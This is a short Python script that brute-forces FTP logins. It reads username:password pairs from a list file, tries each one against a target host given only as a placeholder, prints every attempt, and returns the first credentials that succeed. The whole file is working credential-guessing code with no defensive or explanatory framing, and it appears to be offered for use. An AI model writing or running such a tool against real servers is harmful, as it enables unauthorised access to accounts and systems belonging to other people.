import ftplib

def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip('\r').strip('\n')
        print("Trying: "+str(username)+ " : " +str(password))
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(username, password)
            print("FTP login succeeded: "+str(username)+"/"+str(password))
            ftp.quit()
            return (username, password)
        except Exception:
            pass

passwordfile="pswdlist.txt"
hostname="randome ip"
bruteForceLogin(hostname, passwordfile)